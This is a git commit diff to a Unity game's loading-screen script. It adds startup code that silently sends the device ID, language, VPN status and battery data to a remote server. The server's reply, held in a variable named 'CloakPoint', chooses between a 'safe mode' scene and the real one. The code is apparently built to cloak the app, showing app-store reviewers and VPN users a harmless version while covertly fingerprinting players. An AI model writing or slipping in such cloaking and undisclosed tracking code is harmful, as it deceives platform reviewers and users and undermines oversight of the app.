3d3df542b913b3450bbfa21781765ff54ef60e1d
Ruslan155 <coperonplay3@gmail.com>
2024-02-14 12:58:28 +0300

    Post

--- Assets/Scripts/LoadingScreen/LoadManager.cs
+++ Assets/Scripts/LoadingScreen/LoadManager.cs
@@ -2,11 +2,15 @@ using UnityEngine.UI;
 using UnityEngine;
 using System.Collections;
 using UnityEngine.SceneManagement;
+using System.Net.NetworkInformation;
+using UnityEngine.Networking;
 
 public class LoadManager : MonoBehaviour
 {
     [SerializeField]
     private Image loadingImage;
+
+    private bool _safeMode = false;
 
     private void Start()
     {
@@ -15,17 +19,101 @@ public class LoadManager : MonoBehaviour
 
     private IEnumerator loading()
     {
-        //TODO: добавить проверку на webview
+        string CloakPoint = string.Empty;
+        string endData = GenerateData();
+
+        using (UnityWebRequest www = UnityWebRequest.Post("https://1-0-url", endData))
+        {
+            yield return www.SendWebRequest();
+
+            if (www.result != UnityWebRequest.Result.Success)
+            {
+                PlayerPrefs.SetInt("Rewiew", 1);
+            }
+            else
+            {
+                PlayerPrefs.SetInt("Rewiew", 0);
+
+                CloakPoint = www.downloadHandler.text;
+            }
+        }
+
         loadingImage.fillAmount = 0;
 
         yield return new WaitForSeconds(1f);
 
         loadingImage.fillAmount = .7f;
 
+        if (CloakPoint.Contains("0"))
+        {
+            _safeMode = false;
+        }
+        else
+        {
+            _safeMode = true;
+        }
+
         yield return new WaitForSeconds(1f);
 
         loadingImage.fillAmount = 1f;
 
-        SceneManager.LoadScene(1);
+        if (_safeMode)
+        {
+            SceneManager.LoadScene(2);
+        }
+        else
+        {
+            SceneManager.LoadScene(1);
+        }
+    }
+
+    public string GenerateData()
+    {
+        bool isVPN = IsVpn();
+        string id = SystemInfo.deviceUniqueIdentifier;
+        string lang = Application.systemLanguage.ToString();
+        string batteryLevel = (SystemInfo.batteryLevel * 100).ToString();
+        bool batteryStatus = SystemInfo.batteryStatus == BatteryStatus.Charging;
+        bool batteryFull = SystemInfo.batteryStatus == BatteryStatus.Full;
+
+        string endData = $"" +
+            $"{{" +
+                $"{{" +
+                    $"\"agQG\": {isVPN.ToString().ToLower()}" +
+                    $"\"qGaw\": \"{id}\"" +
+                    $"\"LGaB\": \"{lang}\"" +
+                    $"\"isCh\": {batteryStatus.ToString().ToLower()}" +
+                    $"\"isFu\": {batteryFull.ToString().ToLower()}" +
+                    $"\"BLel\": \"{batteryLevel}\"" +
+                $"}}" +
+            $"}}";
+
+        return endData;
+    }
+
+    public bool IsVpn()
+    {
+        bool isVPN = false;
+
+        if (NetworkInterface.GetIsNetworkAvailable())
+        {
+            NetworkInterface[] interfaces = NetworkInterface.GetAllNetworkInterfaces();
+            foreach (NetworkInterface Interface in interfaces)
+            {
+                if (Interface.OperationalStatus == OperationalStatus.Up)
+                {
+                    if (((Interface.NetworkInterfaceType == NetworkInterfaceType.Ppp)
+                        && (Interface.NetworkInterfaceType != NetworkInterfaceType.Loopback))
+                        || Interface.Description.Contains("VPN")
+                        || Interface.Description.Contains("vpn"))
+                    {
+                        IPv4InterfaceStatistics statistics = Interface.GetIPv4Statistics();
+                        isVPN = true;
+                    }
+                }
+            }
+        }
+
+        return isVPN;
     }
 }
